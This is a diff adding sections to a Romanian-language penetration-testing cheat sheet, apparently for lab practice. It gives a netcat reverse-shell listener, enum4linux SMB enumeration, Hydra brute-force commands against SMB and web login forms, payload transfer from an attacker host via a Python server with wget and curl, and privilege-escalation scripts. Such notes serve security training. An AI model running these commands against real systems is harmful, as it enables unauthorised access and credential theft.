@@ -148,3 +148,72 @@ Tehnică prin care o mașină țintă compromisă inițiază o conexiune de reț
    Un utilitar de rețea (de regulă `netcat`) configurat să aștepte pasiv conexiunea:
    ```bash
    nc -lvnp 1234
+
+---
+
+
+## 🔍 5. Enumerare Servicii de Rețea
+
+### enum4linux
+Utilizat pentru scanarea și enumerarea detaliată a serviciilor **SMB/Samba** (porturile 139/445) pe sisteme Windows și Linux. Este ideal pentru extragerea numelor de utilizatori și a mapelor partajate.
+
+* **Comandă completă (cu salvare în log):**
+  ```bash
+  /opt/enum4linux/enum4linux.pl -a <IP_TINTA> | tee enum4linux.log
+  ```
+* **Opțiuni cheie:**
+  * `-a` (All): Rulează toate testele de enumerare posibile (utilizatori, grupuri, share-uri, politici).
+  * `| tee <fișier>`: Afișează rezultatul în terminal și îl salvează simultan într-un fișier text pentru analiză ulterioară.
+
+---
+
+## 💣 6. Atacuri prin Forță Brută (Brute Forcing)
+
+### Hydra
+Unul dintre cele mai rapide și flexibile instrumente pentru spargerea credențialelor (username/parolă) pe diverse protocoale (SSH, SMB, FTP, HTTP Form).
+
+* **Atac pe serviciul SMB (Rețea):**
+  Dacă ai aflat un username din `enum4linux`, folosește:
+  ```bash
+  hydra -l <username> -P /usr/share/wordlists/rockyou.txt <IP_TINTA> smb
+  ```
+
+* **Atac pe formulare Web (HTTP-POST):**
+  ```bash
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_TINTA> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username" -V
+  ```
+* **Opțiuni cheie:**
+  * `-l` / `-L`: Transmite un singur utilizator (litera mică) sau o listă de utilizatori dintr-un fișier (litera mare).
+  * `-p` / `-P`: Transmite o singură parolă (litera mică) sau o listă de parole / wordlist (litera mare).
+  * `-V` (Verbose): Afișează în timp real fiecare combinație testată.
+
+---
+
+## 📦 7. Transfer de Fișiere în Laborator
+
+### Python HTTP Server (Sursa)
+Cea mai rapidă metodă de a transforma mașina de atac într-un server web temporar pentru a livra scripturi sau payload-uri.
+```bash
+python3 -m http.server 8000
+```
+
+### Metode de descărcare pe mașina țintă
+* **Cu Wget:** `wget http://<IP_ATACATOR>:8000/fisier.ext`
+* **Cu Curl:** `curl http://<IP_ATACATOR>:8000/fisier.ext -o fisier.ext`
+
+### SCP (Secure Copy) cu suport Legacy
+Folosit pentru a copia directoare întregi prin SSH, forțând algoritmi vechi dacă serverul de laborator este învechit:
+```bash
+scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -r user@<IP_TINTA>:/cale/server /cale/local/
+```
+
+---
+
+## 🤖 8. Scripturi de Enumerare Automată (Post-Exploatare)
+
+Aceste unelte sunt colecții de comenzi Bash automate care auditează sistemul local pentru a găsi vectori de Privilege Escalation.
+
+* **`linpeas.sh`**: Cel mai avansat script; caută configurări greșite generalizate. Textul **roșu pe fundal galben** indică o vulnerabilitate aproape sigură.
+* **`lse.sh` (Linux Smart Enumeration)**: Filtrează rezultatele în funcție de nivelul de detalii dorit (opțiunea `-l 0` arată doar erorile critice).
+* **`LinEnum.sh`**: Unealtă clasică și foarte stabilă pentru un sumar curat al drepturilor Sudo și SUID.
+
